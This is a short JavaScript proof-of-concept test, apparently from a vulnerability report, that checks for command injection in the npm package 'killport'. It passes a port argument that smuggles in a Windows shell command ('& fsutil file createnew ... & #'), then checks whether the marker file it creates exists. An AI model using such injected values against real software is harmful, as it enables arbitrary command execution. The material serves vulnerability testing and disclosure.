// test("Command Injection in killport", () => {
//   expect.assertions(2);
  const killport = require("killport");
  const fs = require("fs");
  const path = "./killport";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + false + " }");
  return killport("& fsutil file createnew killport 0 & #").catch(() => {
    file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + true + " }");
    fs.unlink(path, () => {});
  });
// });
